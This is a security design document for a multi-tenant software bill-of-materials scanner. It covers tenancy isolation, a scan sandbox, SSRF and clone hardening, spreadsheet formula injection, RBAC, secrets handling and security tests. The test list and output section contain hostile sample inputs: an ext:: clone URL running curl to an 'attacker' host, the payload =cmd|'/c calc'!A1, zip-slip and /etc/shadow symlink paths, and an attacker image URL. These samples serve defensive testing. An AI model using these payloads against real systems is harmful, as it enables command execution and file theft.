# 05 — Security Model

Tenancy enforcement, the untrusted-code sandbox, the threat model, RBAC, secrets, and the output-side vulnerabilities specific to a BOM product.

**Principle:** every control lands in the phase that introduces the risk. There is no "hardening phase" that retrofits security — deferred security is a rewrite, and the two controls below (RLS and the sandbox) are effectively impossible to add later.

---

## 1. Threat model

What makes AxeBOM unusual is that **executing hostile input is the core function**. We clone arbitrary repositories and run third-party binaries over them. That is remote code execution by design; the only question is blast radius.

| Actor | Capability | Primary concern |
|---|---|---|
| **Malicious repository** | Full control of file contents, filenames, git config, submodules, clone URL | RCE in a scanner, SSRF, exfiltration of secrets and other tenants' data |
| **Malicious tenant user** | Valid credentials, can register any project | Cross-tenant read, resource exhaustion, using us as an SSRF proxy |
| **Tenant registering a `url` source** | Names any public root URL, no credential involved | **Confused-deputy recon abuse**: `services/webrecon`'s subdomain discovery (Milestone 5) fetches from hosts the tenant never individually named — a different risk shape from SSRF against our own infra, closer to "AxeBOM as a scanning proxy against a target the tenant doesn't own" |
| **Compromised upstream scanner** | Ships a backdoored release | Supply-chain — Trivy's channel was compromised twice in March 2026 |
| **Report recipient** | Opens a shared XLSX/PDF | Formula injection, malicious content in component names |
| **Network attacker** | Observes or intercepts | BOM content is confidential under CERT-In §5.3 |

Two assets are worth more than the rest: **other tenants' BOM data** (a competitor's full dependency inventory including unpatched vulnerabilities) and **the git credentials** that would grant access to customer source.

**URL-registered projects (`project.web_sources`) are a distinct risk from a git clone or an upload, both of which the tenant already possesses.** A tenant can name *any* public root URL, and once discovery lands (Milestone 5, `services/webrecon`) that root URL fans out to hosts the tenant never named. Mitigations, all already present or already scoped:
- `max_hosts` (per-source, `1–100`, default `25`) hard-caps how many discovered hosts a single scan may touch, regardless of how many `subfinder` returns.
- `discovery_enabled` lets a tenant opt a source out of fan-out entirely, scanning only the one root URL they registered.
- Scheme is `https`-only at registration (`ValidateWebSourceURL`) and every fetch — root page and any discovered host — reuses the same connection-time private-IP blocking (`fetcher.SafeHTTPClient`/`SafeDialer`) the git-clone path already depends on; see "URL validation" and "Clone hardening" below.
- Rate limiting at the gateway bounds how fast a tenant can register sources or trigger re-scans, capping abuse throughput independent of `max_hosts`.
None of this makes AxeBOM a general-purpose scanning proxy safe to point at infrastructure the tenant doesn't control — it bounds the blast radius, it doesn't eliminate the risk class.

---

## 2. Tenancy — Postgres RLS

### The rule

Isolation is enforced **in the database**, not in application queries.

```sql
ALTER TABLE project.projects ENABLE ROW LEVEL SECURITY;
ALTER TABLE project.projects FORCE  ROW LEVEL SECURITY;

CREATE POLICY tenant_isolation ON project.projects
  USING      (tenant_id = current_setting('app.current_tenant_id')::uuid)
  WITH CHECK (tenant_id = current_setting('app.current_tenant_id')::uuid);
```

Four details, each of which is a hole if missed:

1. **`FORCE`** — without it the table owner bypasses the policy, and the migration role usually *is* the owner.
2. **The application role must not be superuser and must not have `BYPASSRLS`.** A superuser connection silently disables every policy. Enforced by an assertion at startup.
3. **`SET LOCAL`, not `SET`** — issued by the connection wrapper at the start of every transaction, so the setting cannot leak across a pooled connection to another tenant's request.
4. **`tenant_id` comes from the verified JWT**, never from a header, query parameter, or request body.

### Why not `WHERE tenant_id = ?`

Because it works ninety-nine times and fails once. One forgotten clause in one query — a new endpoint, a debug helper, an admin report, a `JOIN` written at 2am — is the breach. RLS makes the safe path the default and the unsafe path require deliberate effort.

`TestRLSCoverage` enumerates every table in tenant schemas and fails on any without `FORCE` and a policy. A migration adding a tenant-scoped table without a policy is incomplete.

### 404, not 403

Cross-tenant access returns `NOTFOUND_*` with **404**. A 403 confirms the resource exists, which is itself a disclosure: an attacker enumerating UUIDs learns which are real.

---

## 3. The scan sandbox

Every scanner invocation runs in an ephemeral container. These are not defaults to tune later — loosening any of them is a security decision requiring an ADR.

| Control | Setting | Defeats |
|---|---|---|
| Network | `--network=none` | Exfiltration, SSRF from inside the scan |
| Filesystem | read-only rootfs; tmpfs workspace | Persistence, tampering |
| Capabilities | `--cap-drop ALL`, `--security-opt no-new-privileges` | Privilege escalation |
| User | non-root, high uid | Container-escape surface |
| Seccomp | default profile | Kernel-surface attacks |
| Memory | `SANDBOX_MEMORY_MB` (4096) | OOM of the host |
| CPU | `SANDBOX_CPU_MILLIS` (2000) | CPU exhaustion |
| PIDs | `SANDBOX_PIDS_MAX` (512) | Fork bombs |
| Disk | `SANDBOX_DISK_MB` (20480) | Disk-fill DoS |
| Wall clock | `SANDBOX_WALL_CLOCK_SEC` (900) | Infinite loops |
| Secrets | **none mounted, none in env** | Credential theft |

**Engines that genuinely need network** (vulnerability-DB refresh) get an **egress allowlist proxy** restricted to specific upstream hosts — never open egress. Preferred posture: pre-warm the DB volume out of band and keep the scan itself at `--network=none`.

### No credentials in the scan path

This follows from the fetcher design and is worth stating as a standalone invariant:

> **Only the fetcher holds git credentials.** Engine containers receive a content-addressed archive from object storage and nothing else. Compromising a scanner yields the code it was already scanning — not access to the customer's repository, not other tenants' data, not a token.

If you find yourself wanting to add a credential to `ScanJobV1`, the design has gone wrong.

### Never execute user build tooling

```
FORBIDDEN: npm install · yarn · pnpm install · mvn · gradle · pip install
           · python setup.py · make · cargo build · go generate
```

All of these execute arbitrary code from the repository — npm lifecycle scripts and Gradle build files are the classic vectors. **Lockfile and manifest parsing only.**

`ALLOW_PACKAGE_MANAGER_RESOLUTION` exists for the cases where a customer accepts the trade-off for better transitive resolution. It is **off by default**, is **per-project not global**, and is surfaced in the UI as an explicit risk acknowledgement — never a checkbox in an admin panel someone flips once and forgets.

### subfinder's sandbox (services/webrecon)

`subfinder` (subdomain discovery for a url-registered project, project-registration plan Milestone 5) runs in the **same table above, with exactly one exception**: `Network` is `NetworkEgress`, not `--network=none` — the same, deliberately named exception the fetcher's git clone already gets (`fetcher.FetcherPolicy()`; subfinder's own policy is `services/webrecon/internal/discover.Policy()`, a sibling function, not that same one — see its doc comment for why it isn't literally shared). Read-only rootfs, dropped capabilities, non-root, seccomp, and every quota are unchanged. `-silent` with no active-probing flags: subfinder queries passive sources only (crt.sh, certificate-transparency logs, DNS aggregators) — it never port-scans or brute-forces.

---

## 4. Fetching untrusted sources

The fetcher is the only component that touches the network on a user's behalf, which makes it the SSRF surface.

### URL validation

| Control | Detail |
|---|---|
| Scheme allowlist | `https` only. Reject `http`, `file`, `git`, `ssh`, and especially **`ext::`** |
| **`GIT_ALLOW_PROTOCOL=https`** | git's `ext::` transport executes an arbitrary command from the URL. This env var is the definitive fix |
| Private-IP blocking | **at connection time, not parse time** |
| Redirect limit | 3, each re-validated |
| DNS | resolve once, connect to the resolved IP, validate that IP |

> **Parse-time IP checks are insufficient.** An attacker controls DNS: the hostname resolves to a public IP when you validate it and to `169.254.169.254` when you connect. This is DNS rebinding, and the only reliable defence is validating the IP you actually connect to — a custom dialer, not a regex on the URL.

Blocked ranges: `127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254/16` (cloud metadata), `::1`, `fc00::/7`, `fe80::/10`, and `0.0.0.0`.

### Clone hardening

```
--depth 1 --single-branch --no-tags
-c core.hooksPath=/dev/null        # repo-supplied hooks never run
-c core.symlinks=false             # symlink escape
--no-recurse-submodules            # submodule URLs are attacker-controlled
```

### Archive limits

| Limit | Default | Defeats |
|---|---|---|
| `FETCH_MAX_ARCHIVE_MB` | 2048 | storage DoS |
| `FETCH_MAX_FILES` | 500 000 | inode exhaustion |
| `FETCH_MAX_INFLATION_RATIO` | 100 | **decompression bombs** — checked *during* extraction, aborting mid-stream |
| `FETCH_CLONE_TIMEOUT_SEC` | 600 | slow-loris |

Extraction rejects absolute paths, any `..` segment (**zip-slip**), symlinks pointing outside the workspace, hard links, and device/FIFO entries.

### Path sanitization

Filenames may contain newlines, NUL bytes, 4-byte emoji, RTL overrides and 8 KB paths. Sanitize and truncate **before** database insert — a NUL silently truncates a Postgres text value, so what you store is not what you scanned.

### services/webrecon's fetch surface — a sharper SSRF variant

Every page/script fetch `services/webrecon` makes reuses the SAME `fetcher.SafeHTTPClient` — connection-time private-IP blocking, redirect re-validation, identical to the git-clone path above. Two controls exist on top of that, specific to the confused-deputy/recon-abuse risk a url-registered project introduces (`01. Threat model`):

| Control | Detail |
|---|---|
| Script-fetch scope | The page's own **origin** (host **and port** — a same-hostname-different-port check was caught and fixed in review before this shipped, see `services/webrecon/internal/fingerprint/fetch_test.go`'s same-origin tests) plus a short, explicit CDN allowlist (`cdnjs.cloudflare.com`, `unpkg.com`, `cdn.jsdelivr.net`, `ajax.googleapis.com`, `code.jquery.com`). Anything else is **recorded as skipped, never fetched** — never a silent drop. |
| `max_hosts` | Hard cap (`project.web_sources.max_hosts`, 1–100, default 25) on how many subfinder-discovered hosts a single scan may touch, enforced in `services/webrecon`'s own host-resolution step — checked BEFORE subfinder ever runs, not truncated after. |
| `discovery_enabled` | Per-source opt-out. A tenant can register a url source that fingerprints only the one page they explicitly gave — no fan-out at all. |
| Per-request timeout | 15s per page/script fetch (`perRequestTimeout`). Unlike the fetcher's clone — sandboxed, with a container-enforced wall clock — these are plain Go HTTP calls in the worker's own process; without an explicit bound, one unresponsive host would hang the whole job. |
| Credentials | **None, ever.** A url source is never authenticated (`project.web_sources` has no `credential_ref` column), so `services/webrecon` holds nothing to leak — a materially smaller blast radius than the fetcher, which is the one component permitted to hold a git token. |

None of this makes AxeBOM a general-purpose scanning proxy safe to point at infrastructure the tenant does not control — it bounds the blast radius, it does not eliminate the risk class. See `01. Threat model`'s own paragraph on this for the full reasoning.

---

## 5. Output-side vulnerabilities

Unusually for a backend product, AxeBOM's **output** is an attack surface: hostile strings from a scanned repository end up in files that other people open.

### Spreadsheet formula injection

A component legitimately named `=cmd|'/c calc'!A1` **executes when the XLSX is opened**. Component names, licenses, descriptions and file paths all flow from untrusted repositories into spreadsheet cells.

**Prefix any cell value beginning with `=`, `+`, `-`, `@`, TAB (0x09) or CR (0x0D) with a single quote.**

This is applied **unconditionally in the XLSX/CSV writer**, not at call sites — a call site will eventually be added without it. There is a dedicated test with a fixture component named exactly that.

### PDF and HTML

Reports render untrusted strings. Escape on output; never build markup by concatenation. The PDF renderer runs with remote resource loading disabled — an `<img src="http://attacker/">` in a component description must not phone home.

### Share links

`report.share_links` stores only a **hash** of the token. Tokens are 256-bit, generated with a CSPRNG, optionally expiring, optionally download-capped. Every access writes an `auth.audit_log` row. Revocation is immediate.

The `/shared/:token` endpoint is unauthenticated by design and therefore rate-limited by IP, returns `Cache-Control: no-store`, and serves `Content-Disposition: attachment` — never inline HTML that could run script in our origin.

---

## 6. RBAC

| Capability | Owner | Admin | Analyst | Viewer |
|---|---|---|---|---|
| Manage tenant, billing, SSO | ✅ | | | |
| Manage members and roles | ✅ | ✅ | | |
| Create / connect projects | ✅ | ✅ | ✅ | |
| Edit project practices | ✅ | ✅ | ✅ | |
| View hardware BOM (HBOM) and its part-lookup provider | ✅ | ✅ | ✅ | ✅ |
| Import / edit hardware BOM, run a part lookup | ✅ | ✅ | ✅ | |
| View quantum BOM (QBOM) device metadata and form | ✅ | ✅ | ✅ | ✅ |
| Save quantum BOM device metadata | ✅ | ✅ | ✅ | |
| Run scans, manage campaigns | ✅ | ✅ | ✅ | |
| View which engines run for a BOM family | ✅ | ✅ | ✅ | ✅ |
| Configure which engines run for a BOM family (`scan.engine_policy`) | ✅ | ✅ | | |
| Enable package-manager resolution | ✅ | ✅ | | |
| View VEX statements and history | ✅ | ✅ | ✅ | ✅ |
| Edit VEX / triage | ✅ | ✅ | ✅ | |
| View CSAF 2.0 advisories | ✅ | ✅ | ✅ | ✅ |
| Publish a CSAF advisory from a VEX statement | ✅ | ✅ | ✅ | |
| View and add comments | ✅ | ✅ | ✅ | ✅ |
| Edit or delete a comment | ✅ (own) | ✅ (own) | ✅ (own) | ✅ (own) |
| View reports and dependencies | ✅ | ✅ | ✅ | ✅ |
| View crypto BOM (CBOM) asset inventory | ✅ | ✅ | ✅ | ✅ |
| View AI BOM (AIBOM) model inventory | ✅ | ✅ | ✅ | ✅ |
| Record an AI model's user-supplied elements (intended usage, out-of-scope usage, security requirements, attestation) | ✅ | ✅ | ✅ | |
| Download reports | ✅ | ✅ | ✅ | ✅* |
| Create share links | ✅ | ✅ | ✅ | |
| Comment | ✅ | ✅ | ✅ | ✅ |
| Read audit log | ✅ | ✅ | | |
| Manage API keys (mint, list, revoke) | ✅ | | | |

\* Viewer download is gated by the report's `visibility`. A `private` report — which by CERT-In §5.3.2 is the one containing vulnerability detail — requires Analyst or above.

Enforcement is a **middleware authorization matrix**, not scattered `if role ==` checks. `TestAuthzMatrix` asserts every (role, resource, action) triple, and a new endpoint without a matrix entry **fails the test rather than defaulting to allow**.

Maps to CERT-In §5.3.1 (p.32): define RBAC, identify stakeholders, assign read-only / edit / restricted access.

---

## 7. Secrets

| Secret | Storage | Notes |
|---|---|---|
| GitHub OAuth tokens | Vault, referenced by path | `project.repository_connections.credential_ref` holds a **path**, never a token |
| Report signing key | Vault Transit / KMS | private key never leaves the KMS boundary |
| JWT signing key | Vault, rotatable | rotation with an overlap window |
| NVD / Nexar / Mouser keys | Vault | injected only into the components that call them |
| DB / S3 credentials | Vault or platform-injected env | never in an image |

Rules: nothing secret in an image, a log, an event payload, or `argv` (it is world-readable in `/proc`). `argv_redacted` in `ScanResultV1` strips known secret-bearing flags. Structured logs pass through a redaction filter keyed on field name **and** value shape.

**The GitHub "connect" token is a partial exception to "never in the SPA," and it is a deliberate, bounded one.** `docs/02-CONTRACTS.md`'s connect flow hands a `repo`-scoped token to the wizard tab so it can call `GET /github/repos` and, on selection, `POST /projects/:id/connections`. It lives in React state only (never `localStorage`/`sessionStorage`), for the lifetime of one wizard session, and is gone the moment the tab navigates away or the connection call completes — at which point Vault, not the browser, is the only place it persists.

**Known residual risk, tracked as a fast-follow, not fixed here:** the token is scoped to `repo`, which is *every* repository the authorizing GitHub account can read — not just the one the wizard ultimately connects. A classic OAuth App cannot narrow this further; only a GitHub App with per-repository installation permissions can. Migrating to a GitHub App (fine-grained installation tokens, no standing `repo` grant) is the correct long-term fix and is intentionally out of scope for the flow described here.

---

## 8. Transport, storage, audit

**In transit:** TLS 1.2+ externally; mTLS between services in production. Webhooks are HMAC-signed with the timestamp inside the signed payload; deliveries older than 5 minutes are rejected to prevent replay.

**At rest:** Postgres and object storage encrypted (CERT-In §5.3.3, p.32). Raw scan artifacts are immutable — **never mutated or deleted** — because they are the evidence that makes a report defensible and normalization replayable.

**Reports are signed.** Detached Ed25519 signature per report, verifiable with `axebom verify <report>` using the published public key. Satisfies CERT-In §5.3.3.2 and §5.3.5 (integrity, and consumer-side verification).

**Audit log is append-only.** No `UPDATE` or `DELETE` grant to the application role. Records auth events, project changes, scan triggers, report downloads, share creation and access, VEX edits, and role changes. Exportable. Required by CERT-In §5.3.6 (p.33).

---

## 9. Test requirements

Security tests are not optional extras; each is the acceptance criterion of the phase that introduces the control.

**Phase 1/3 — tenancy.** `TestRLSCoverage` over every table. Cross-tenant fetch returns 404. A query without `SET LOCAL` fails closed rather than returning all rows. The app role is asserted non-superuser, non-`BYPASSRLS` at startup.

**Phase 5 — the sandbox escape suite.** Each is a real fixture repository:

- clone URL `ext::sh -c 'curl attacker'` → rejected
- clone URL resolving to `169.254.169.254` → rejected at connect time
- DNS-rebinding host → rejected
- zip-slip archive with `../../etc/passwd` → rejected
- symlink to `/etc/shadow` → not followed
- 10 GB-from-1 MB decompression bomb → aborted mid-extraction
- repo with a malicious `.git/hooks/post-checkout` → hook never runs
- fork bomb in a scanned build file → PID limit holds
- scanner attempting outbound connection → blocked, logged

**Phase 9 — output.** Component named `=cmd|'/c calc'!A1` is escaped in XLSX and CSV. A component description containing an external image reference does not cause a fetch during PDF render. Signature verification passes on a good report and fails on a mutated one.

**Phase 16 — pen-test.** External review of the sandbox boundary and tenancy isolation before GA.
